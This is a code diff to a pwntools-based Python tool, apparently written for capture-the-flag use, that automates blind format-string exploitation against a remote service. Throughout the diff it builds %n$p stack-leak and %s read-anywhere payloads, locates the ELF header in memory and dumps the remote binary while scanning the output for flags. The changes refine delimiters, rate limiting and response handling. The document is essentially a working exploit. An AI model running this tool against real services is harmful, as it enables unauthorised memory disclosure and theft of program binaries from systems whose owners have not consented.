@@ -40,7 +40,7 @@ class ffstr():
 		self.start	= None
 		
 		# Format string delimiters
-		self.delimiters = None
+		self.delimiters = [b"   d34d|",b"|b33f   "]
 		
 		# Regular Expression Pattern
 		self.re_HexaPattern 	= b'(0[xX][0-9a-fA-F]+)|(\(n.l?\))'
@@ -56,6 +56,7 @@ class ffstr():
 		# Anti DoS
 		self.last_request = None
 		self.nb_request   = None
+		self.rate_limit	  = 100
 		
 	def getArgs(self):
 		# Get args from pwntools
@@ -95,7 +96,13 @@ class ffstr():
 		if "DBG" not in args.keys():
 			context.log_level = 'error'
 
-		
+		# Rate Limiting setting
+		if "RL" in args.keys():
+			if int(args["RL"])>1:
+				self.rate_limit = int(args["RL"])
+			else:
+				self.rate_limit = 100
+				
 	def yesno(self):
 		# yes or no for further analysis
 		return input("Continue y/n :").strip().lower() == "y"
@@ -112,7 +119,7 @@ class ffstr():
 		if self.nb_request is None:
 			self.nb_request = 1
 		self.nb_request += 1
-		if self.nb_request % 100 == 0:
+		if self.nb_request % self.rate_limit == 0:
 			self.yesno()
 			
 		# Too rapid connection trigger too a slow down
@@ -140,7 +147,7 @@ class ffstr():
 				if line.find(elt)>0:
 					# Left & Right
 					pos = line.find(elt)
-					self.delimiters = (line[:pos],line[pos+len(elt):])
+					#self.delimiters = (line[:pos],line[pos+len(elt):])
 		
 	def mimic(self,sequence,payload,fake=b"a"):
 		# Mimic the software behavior from observe behavior
@@ -212,21 +219,23 @@ class ffstr():
 		# close the connection
 		self.close()
 		
-	def stackPayload(self,n,var,size=8,left="",right=""):
+	def stackPayload(self,n,var,size=8,left=b"",right=b""):
 		# Return a stack read payload of constant size
-		payload = left+"%"+str(n)+"$"+var+right+" "*size
-		payload = payload[:size].encode()
+		payload = left+b"%"+str(n).encode()+b"$"+var+right+b" "*size
+		payload = payload[:size+len(left)+len(right)]
 		return payload
 		
 	
 	def stackDump(self,nb_elt=100):
 		# Dump the stack, maximum of nb_elt element
 		
+		print("Dumping stack ...")
+		
 		# Store the stack
 		self.stack	= []
 		
 		# Generate Payloads
-		payload = [self.stackPayload(i+1,"p",8) for i in range(nb_elt)]
+		payload = [self.stackPayload(i+1,b"p",8,left=self.delimiters[0],right=self.delimiters[1]) for i in range(nb_elt)]
 
 		# Monitoring payload consumption done in mimic
 		while len(payload)>0:
@@ -248,7 +257,7 @@ class ffstr():
 		flags = re.findall(self.re_FlagPattern, txt)
 		if flags:
 			for flag in flags:
-				print(flag.decode())
+				print(flag)
 				
 				# Continue or not ?
 				if not self.yesno():
@@ -330,6 +339,7 @@ class ffstr():
 		# Check if io has been instanciated
 		if self.io is None:
 			self.connect()
+			
 			# re-Initiate behavior
 			self.behavior = 0
 			
@@ -344,6 +354,7 @@ class ffstr():
 			self.io.sendline(exploit)
 		else:
 			self.io.sendline(fake)
+
 			
 		# Increase behavior, change conditions
 		self.behavior += 1
@@ -356,8 +367,9 @@ class ffstr():
 			try:
 				data += self.io.recvline(timeout=self.timeout)
 			except:
-				# Cleaning
-				data += self.io.recvall()
+				# Cleaning + provide delimiters to cacth something and avoid infinite loop
+				data += self.io.recvall()+b"".join(self.delimiters)
+				break
 		
 		# return finding
 		return data
@@ -367,14 +379,15 @@ class ffstr():
 		# Format String Read Anywhere payload
 		
 		# Calculte shifting of stack arg due to padding
-		L = len(leftpad+rightpad)+minsize
+		L = len(rightpad)+minsize
 				
 		if self.bits == 32:
 			pos_arg = self.stack_arg+ L // 4
-			pl = self.stackPayload(pos_arg,"s",size=L,left=leftpad,right=rightpad)+p32(addr)
+			pl = self.stackPayload(pos_arg,b"s",size=8,left=leftpad,right=rightpad)+p32(addr)
 		else:
 			pos_arg = self.stack_arg+ L // 8
-			pl = self.stackPayload(pos_arg,"s",size=L,left=leftpad,right=rightpad)+p64(addr)
+			pl = self.stackPayload(pos_arg,b"s",size=8,left=leftpad,right=rightpad)+p64(addr)
+		
 		return pl	
 			
 	def locateBinary(self):
@@ -382,8 +395,10 @@ class ffstr():
 		
 		# Working on a stack copy
 		if self.blind_behavior.count(True) < 2 :
-			self.info("Cannot Leak ...")
+			print("Cannot Leak ...")
 			return
+		
+		print("Locating Binary ...")
 		
 		# Storing start file offset
 		self.start = []
@@ -394,26 +409,32 @@ class ffstr():
 			# Generate a set of offset to be tested
 			guessed = self.unOffset(st)
 			
-			# Guess each offset from "guessed" lisy
+			# Guess each offset from "guessed" list
 			for guess in guessed:
-			
+				
 				# Leak an hexadecimal value
 				leak = None
 				while leak is None:
-					data = self.asyncExchange(self.stackPayload(i+1,"p")) #
+					data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
 					regex = re.search(self.re_HexaPattern, data)
 					if regex:
 						leak = int(regex[0],16)
+						
 				print("Leak "+hex(leak)+" ... Offset "+hex(guess),end="\r")
 				
 				# Read anywhere format string
-				pl = self.readAnywhere(leak - guess,minsize=8,leftpad="",rightpad="")
-				
+				pl = self.readAnywhere(leak - guess,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+
+				# in case of negative value
+				if leak-guess <= 0:
+					continue
+					
 				# Get Data
 				data = b""
 				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-					data = self.asyncExchange(pl)
+					data += self.asyncExchange(pl)
 
+				
 				# ELF Header
 				if data.find(b"\x7fELF") > -1:
 					self.start = (i ,guess) 
@@ -430,6 +451,8 @@ class ffstr():
 		
 	def dumpBinary(self):
 		# Dump Binary
+		
+		print("Dumping Binary ...")
 		
 		# Binary
 		binary = b""
@@ -452,14 +475,14 @@ class ffstr():
 			# Leak an hexadecimal value
 			leak = None
 			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i+1,"p")) #
+				data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
 				regex = re.search(self.re_HexaPattern, data)
 				if regex:
 					leak = int(regex[0],16)
 						
 			# Read anywhere format string
-			pl = self.readAnywhere(leak - offset + n,minsize=8,leftpad="    d34d",rightpad="b33f    ")
-
+			pl = self.readAnywhere(leak - offset + n,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+			
 			# test is \n is present in generated payload
 			if pl.find(b"\n")>-1:
 				binary += b"\x00"
@@ -469,14 +492,14 @@ class ffstr():
 			# Get Data
 			data = b""
 			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-				data = self.asyncExchange(pl)
+				data += self.asyncExchange(pl)
 
 
-			left = data.find(b"d34d")+len(b"d34d")
-			right= data.find(b"b33f")
+			left = data.find(self.delimiters[0])+len(self.delimiters[0])
+			right= data.find(self.delimiters[1])
 			
 			# Extract data 
-			if data.find(b"d34d")>-1 and data.find(b"b33f")>-1:
+			if left >-1 and right >-1:
 				dump =data[left:right]
 				L = len(dump)
 				if L != 0 and dump != b"(null)" and dump != b"(nil)":
@@ -607,7 +630,7 @@ if __name__ == "__main__":
 	exploit = ffstr()
 	exploit.getArgs()
 	exploit.mentalist(nb_input=10)
-	exploit.stackDump(nb_elt=100)
+	exploit.stackDump(nb_elt=200)
 	exploit.stackAnalyze()
 	exploit.locateBinary()
 	exploit.dumpBinary()
